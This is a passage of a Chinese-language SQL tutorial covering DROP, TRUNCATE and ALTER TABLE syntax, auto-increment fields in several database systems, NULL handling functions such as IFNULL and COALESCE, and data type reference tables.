<p>用于 DB2/Oracle 的 DROP INDEX 语法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name</span><br></pre></td></tr></table></figure>

<p>用于 MySQL 的 DROP INDEX 语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> index_name</span><br></pre></td></tr></table></figure>

<p>DROP TABLE 语句</p>
<p>DROP TABLE 语句用于删除表。</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP <span class="keyword">TABLE</span> table_name</span><br></pre></td></tr></table></figure>

<p>DROP DATABASE 语句</p>
<p>DROP DATABASE 语句用于删除数据库。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> database_name</span><br></pre></td></tr></table></figure>

<p>TRUNCATE TABLE 语句</p>
<p>如果我们仅仅需要删除表内的数据，但并不删除表本身，那么我们该如何做呢？</p>
<p>请使用 TRUNCATE TABLE 语句：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUNCATE <span class="keyword">TABLE</span> table_name</span><br></pre></td></tr></table></figure>

<h4 id="SQL-ALTER-TABLE-语句"><a href="#SQL-ALTER-TABLE-语句" class="headerlink" title="SQL ALTER TABLE 语句"></a>SQL ALTER TABLE 语句</h4><hr>
<p>ALTER TABLE 语句</p>
<p>ALTER TABLE 语句用于在已有的表中添加、删除或修改列。</p>
<p>SQL ALTER TABLE 语法</p>
<p>如需在表中添加列，请使用下面的语法:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p>如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> column_name</span><br></pre></td></tr></table></figure>

<p>要改变表中列的数据类型，请使用下面的语法：</p>
<p><strong>SQL Server / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p><strong>My SQL / Oracle：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">MODIFY</span> <span class="keyword">COLUMN</span> column_name datatype</span><br></pre></td></tr></table></figure>

<p>Oracle 10G 之后版本:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">MODIFY</span> column_name datatype;</span><br></pre></td></tr></table></figure>

<hr>
<p>SQL ALTER TABLE 实例</p>
<p>请看 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>现在，我们想在 “Persons” 表中添加一个名为 “DateOfBirth” 的列。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> DateOfBirth <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<p>请注意，新列 “DateOfBirth” 的类型是 date，可以存放日期。数据类型规定列中可以存放的数据的类型。如需了解 MS Access、MySQL 和 SQL Server 中可用的数据类型，请访问我们完整的 <a href="https://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">数据类型参考手册</a>。</p>
<p>现在，”Persons” 表将如下所示：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
<th align="left">DateOfBirth</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
<td align="left"></td>
</tr>
</tbody></table>
<hr>
<p>改变数据类型实例</p>
<p>现在，我们想要改变 “Persons” 表中 “DateOfBirth” 列的数据类型。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> DateOfBirth <span class="keyword">year</span></span><br></pre></td></tr></table></figure>

<p>请注意，现在 “DateOfBirth” 列的类型是 year，可以存放 2 位或 4 位格式的年份。</p>
<hr>
<p>DROP COLUMN 实例</p>
<p>接下来，我们想要删除 “Person” 表中的 “DateOfBirth” 列。</p>
<p>我们使用下面的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> DateOfBirth</span><br></pre></td></tr></table></figure>

<p>现在，”Persons” 表将如下所示：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<h4 id="AUTO-INCREMENT-字段"><a href="#AUTO-INCREMENT-字段" class="headerlink" title="AUTO INCREMENT 字段"></a>AUTO INCREMENT 字段</h4><p>我们通常希望在每次插入新记录时，自动地创建主键字段的值。</p>
<p>我们可以在表中创建一个 auto-increment 字段。</p>
<hr>
<p>用于 MySQL 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (ID)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MySQL 使用 AUTO_INCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTO_INCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p>要让 AUTO_INCREMENT 序列以其他的值起始，请使用下面的 SQL 语法：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER <span class="keyword">TABLE</span> Persons <span class="comment">AUTO_INCREMENT=100</span></span><br></pre></td></tr></table></figure>

<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 SQL Server 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID int IDENTITY(1,1) PRIMARY KEY,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS SQL Server 使用 <strong>IDENTITY</strong> 关键字来执行 auto-increment 任务。</p>
<p>在上面的实例中，<strong>IDENTITY 的开始值是 1，每条新记录递增 1。</strong></p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 identity 改为 IDENTITY(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 Access 的语法</p>
<p>下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 auto-increment 主键字段：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">ID Integer PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>MS Access 使用 AUTOINCREMENT 关键字来执行 auto-increment 任务。</p>
<p>默认地，AUTOINCREMENT 的开始值是 1，每条新记录递增 1。</p>
<p><strong>提示：</strong>要规定 “ID” 列以 10 起始且递增 5，请把 autoincrement 改为 AUTOINCREMENT(10,5)。</p>
<p>要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">FirstName</span>,LastName)</span><br><span class="line">VALUES ('Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋予一个唯一的值。”FirstName” 列会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<hr>
<p>用于 Oracle 的语法</p>
<p>在 Oracle 中，代码稍微复杂一点。</p>
<p>您必须通过 sequence 对象（该对象生成数字序列）创建 auto-increment 字段。</p>
<p>请使用下面的 CREATE SEQUENCE 语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">SEQUENCE</span> seq_person</span><br><span class="line"><span class="keyword">MINVALUE</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">START</span> <span class="keyword">WITH</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">INCREMENT</span> <span class="keyword">BY</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">CACHE</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>上面的代码创建一个名为 seq_person 的 sequence 对象，它以 1 起始且以 1 递增。该对象缓存 10 个值以提高性能。cache 选项规定了为了提高访问速度要存储多少个序列值。</p>
<p>要在 “Persons” 表中插入新记录，我们必须使用 nextval 函数（该函数从 seq_person 序列中取回下一个值）：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO Persons (<span class="name">ID</span>,FirstName,LastName)</span><br><span class="line">VALUES (<span class="name">seq_person</span>.nextval,'Lars','Monsen')</span><br></pre></td></tr></table></figure>

<p>上面的 SQL 语句会在 “Persons” 表中插入一条新记录。”ID” 列会被赋值为来自 seq_person 序列的下一个数字。”FirstName”列 会被设置为 “Lars”，”LastName” 列会被设置为 “Monsen”。</p>
<p>给已经存在的colume添加自增语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CHANGE</span> column_name column_name data_type(<span class="keyword">size</span>) constraint_name AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">CHANGE</span> <span class="keyword">id</span> <span class="keyword">id</span> <span class="built_in">INT</span>( <span class="number">11</span> ) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-NULL-值"><a href="#SQL-NULL-值" class="headerlink" title="SQL NULL 值"></a>SQL NULL 值</h4><hr>
<p>NULL 值代表遗漏的未知数据。</p>
<p>默认地，表的列可以存放 NULL 值。</p>
<p>本章讲解 IS NULL 和 IS NOT NULL 操作符。</p>
<hr>
<p>SQL NULL 值</p>
<p>如果表中的某个列是可选的，那么我们可以在不向该列添加值的情况下插入新记录或更新已有的记录。这意味着该字段将以 NULL 值保存。</p>
<p>NULL 值的处理方式与其他值不同。</p>
<p>NULL 用作未知的或不适用的值的占位符。</p>
<p><strong>注释：</strong>无法比较 NULL 和 0；它们是不等价的。</p>
<hr>
<p>SQL 的 NULL 值处理</p>
<p>请看下面的 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>假如 “Persons” 表中的 “Address” 列是可选的。这意味着如果在 “Address” 列插入一条不带值的记录，”Address” 列会使用 NULL 值保存。</p>
<p>那么我们如何测试 NULL 值呢？</p>
<p>无法使用比较运算符来测试 NULL 值，比如 =、&lt; 或 &lt;&gt;。</p>
<p>我们必须使用 IS NULL 和 IS NOT NULL 操作符。</p>
<hr>
<p>SQL IS NULL</p>
<p>我们如何仅仅选取在 “Address” 列中带有 NULL 值的记录呢？</p>
<p>我们必须使用 IS NULL 操作符：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT LastName,FirstName,Address <span class="keyword">FROM</span> Persons</span><br><span class="line">WHERE<span class="built_in"> Address </span>IS <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>请始终使用 IS NULL 来查找 NULL 值。</p>
<hr>
<p>SQL IS NOT NULL</p>
<p>我们如何仅仅选取在 “Address” 列中不带有 NULL 值的记录呢？</p>
<p>我们必须使用 IS NOT NULL 操作符：</p>
<p>SELECT LastName,FirstName,Address FROM Persons<br>WHERE Address IS NOT NULL</p>
<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
</tr>
</tbody></table>
<p>在下一节中，我们了解 ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数。</p>
<h4 id="SQL-NULL-函数"><a href="#SQL-NULL-函数" class="headerlink" title="SQL NULL 函数"></a>SQL NULL 函数</h4><hr>
<p>SQL ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数</p>
<p>请看下面的 “Products” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">ProductName</th>
<th align="left">UnitPrice</th>
<th align="left">UnitsInStock</th>
<th align="left">UnitsOnOrder</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Jarlsberg</td>
<td align="left">10.45</td>
<td align="left">16</td>
<td align="left">15</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Mascarpone</td>
<td align="left">32.56</td>
<td align="left">23</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Gorgonzola</td>
<td align="left">15.67</td>
<td align="left">9</td>
<td align="left">20</td>
</tr>
</tbody></table>
<p>假如 “UnitsOnOrder” 是可选的，而且可以包含 NULL 值。</p>
<p>我们使用下面的 SELECT 语句：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+UnitsOnOrder)</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p>在上面的实例中，如果有 “UnitsOnOrder” 值是 NULL，那么结果是 NULL。</p>
<p>微软的 ISNULL() 函数用于规定如何处理 NULL 值。</p>
<p>NVL()、IFNULL() 和 COALESCE() 函数也可以达到相同的结果。</p>
<p>在这里，我们希望 NULL 值为 0。</p>
<p>下面，如果 “UnitsOnOrder” 是 NULL，则不会影响计算，因为如果值是 NULL 则 ISNULL() 返回 0：</p>
<p><strong>SQL Server / MS Access</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="built_in">ISNULL</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p><strong>Oracle</strong></p>
<p>Oracle 没有 ISNULL() 函数。不过，我们可以使用 NVL() 函数达到相同的结果：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p><strong>MySQL</strong></p>
<p>MySQL 也拥有类似 ISNULL() 的函数。不过它的工作方式与微软的 ISNULL() 函数有点不同。</p>
<p>在 MySQL 中，我们可以使用 IFNULL() 函数，如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="built_in">IFNULL</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用 COALESCE() 函数，如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ProductName,UnitPrice*(UnitsInStock+<span class="keyword">COALESCE</span>(UnitsOnOrder,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">FROM</span> Products</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--如果alexa列为null值，则赋予0，否则，取原值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,<span class="keyword">url</span>,<span class="keyword">ifnull</span>(alexa,<span class="number">0</span>)<span class="keyword">from</span> websites;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,<span class="keyword">url</span>,<span class="keyword">COALESCE</span>(alexa,<span class="number">0</span>) <span class="keyword">from</span> websites;</span><br></pre></td></tr></table></figure>

<h3 id="SQL-通用数据类型"><a href="#SQL-通用数据类型" class="headerlink" title="SQL 通用数据类型"></a>SQL 通用数据类型</h3><hr>
<p>数据类型定义列中存放的值的种类。</p>
<hr>
<p>SQL 通用数据类型</p>
<p>数据库表中的每个列都要求有名称和数据类型。Each column in a database table is required to have a name and a data type.</p>
<p>SQL 开发人员必须在创建 SQL 表时决定表中的每个列将要存储的数据的类型。数据类型是一个标签，是便于 SQL 了解每个列期望存储什么类型的数据的指南，它也标识了 SQL 如何与存储的数据进行交互。</p>
<p>下面的表格列出了 SQL 中通用的数据类型：</p>
<table>
<thead>
<tr>
<th>CHARACTER(n)</th>
<th>字符/字符串。固定长度 n。</th>
</tr>
</thead>
<tbody><tr>
<td>VARCHAR(n) 或 CHARACTER VARYING(n)</td>
<td>字符/字符串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>BINARY(n)</td>
<td>二进制串。固定长度 n。</td>
</tr>
<tr>
<td>BOOLEAN</td>
<td>存储 TRUE 或 FALSE 值</td>
</tr>
<tr>
<td>VARBINARY(n) 或 BINARY VARYING(n)</td>
<td>二进制串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>INTEGER(p)</td>
<td>整数值（没有小数点）。精度 p。</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>整数值（没有小数点）。精度 5。</td>
</tr>
<tr>
<td>INTEGER</td>
<td>整数值（没有小数点）。精度 10。</td>
</tr>
<tr>
<td>BIGINT</td>
<td>整数值（没有小数点）。精度 19。</td>
</tr>
<tr>
<td>DECIMAL(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。例如：decimal(5,2) 是一个小数点前有 3 位数，小数点后有 2 位数的数字。</td>
</tr>
<tr>
<td>NUMERIC(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。（与 DECIMAL 相同）</td>
</tr>
<tr>
<td>FLOAT(p)</td>
<td>近似数值，尾数精度 p。一个采用以 10 为基数的指数计数法的浮点数。该类型的 size 参数由一个指定最小精度的单一数字组成。</td>
</tr>
<tr>
<td>REAL</td>
<td>近似数值，尾数精度 7。</td>
</tr>
<tr>
<td>FLOAT</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>DOUBLE PRECISION</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>DATE</td>
<td>存储年、月、日的值。</td>
</tr>
<tr>
<td>TIME</td>
<td>存储小时、分、秒的值。</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>存储年、月、日、小时、分、秒的值。</td>
</tr>
<tr>
<td>INTERVAL</td>
<td>由一些整数字段组成，代表一段时间，取决于区间的类型。</td>
</tr>
<tr>
<td>ARRAY</td>
<td>元素的固定长度的有序集合</td>
</tr>
<tr>
<td>MULTISET</td>
<td>元素的可变长度的无序集合</td>
</tr>
<tr>
<td>XML</td>
<td>存储 XML 数据</td>
</tr>
</tbody></table>
<h3 id="SQL-数据类型快速参考手册"><a href="#SQL-数据类型快速参考手册" class="headerlink" title="SQL 数据类型快速参考手册"></a>SQL 数据类型快速参考手册</h3><p>然而，不同的数据库对数据类型定义提供不同的选择。</p>
<p>下面的表格显示了各种不同的数据库平台上一些数据类型的通用名称：</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">Access</th>
<th align="left">SQLServer</th>
<th align="left">Oracle</th>
<th align="left">MySQL</th>
<th align="left">PostgreSQL</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>boolean</em></td>
<td align="left">Yes/No</td>
<td align="left">Bit</td>
<td align="left">Byte</td>
<td align="left">N/A</td>
<td align="left">Boolean</td>
</tr>
<tr>
<td align="left"><em>integer</em></td>
<td align="left">Number (integer)</td>
<td align="left">Int</td>
<td align="left">Number</td>
<td align="left">Int Integer</td>
<td align="left">Int Integer</td>
</tr>
<tr>
<td align="left"><em>float</em></td>
<td align="left">Number (single)</td>
<td align="left">Float Real</td>
<td align="left">Number</td>
<td align="left">Float</td>
<td align="left">Numeric</td>
</tr>
<tr>
<td align="left"><em>currency</em></td>
<td align="left">Currency</td>
<td align="left">Money</td>
<td align="left">N/A</td>
<td align="left">N/A</td>
<td align="left">Money</td>
</tr>
<tr>
<td align="left"><em>string (fixed)</em></td>
<td align="left">N/A</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
</tr>
<tr>
<td align="left"><em>string (variable)</em></td>
<td align="left">Text (&lt;256) Memo (65k+)</td>
<td align="left">Varchar</td>
<td align="left">Varchar Varchar2</td>
<td align="left">Varchar</td>
<td align="left">Varchar</td>
</tr>
<tr>
<td align="left"><em>binary object</em></td>
<td align="left">OLE Object Memo</td>
<td align="left">Binary (fixed up to 8K) Varbinary (&lt;8K) Image (&lt;2GB)</td>
<td align="left">Long Raw</td>
<td align="left">Blob Text</td>
<td align="left">Binary Varbinary</td>
</tr>
</tbody></table>
<p>在不同的数据库中，同一种数据类型可能有不同的名称。即使名称相同，尺寸和其他细节也可能不同！ <strong>请总是检查文档！</strong></p>
<h3 id="SQL-用于各种数据库的数据类型"><a href="#SQL-用于各种数据库的数据类型" class="headerlink" title="SQL 用于各种数据库的数据类型"></a>SQL 用于各种数据库的数据类型</h3><hr>
<p>Microsoft Access、MySQL 和 SQL Server 所使用的数据类型和范围。</p>
<hr>
<h4 id="Microsoft-Access-数据类型"><a href="#Microsoft-Access-数据类型" class="headerlink" title="Microsoft Access 数据类型"></a>Microsoft Access 数据类型</h4><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Text</td>
<td align="left">用于文本或文本与数字的组合。最多 255 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Memo</td>
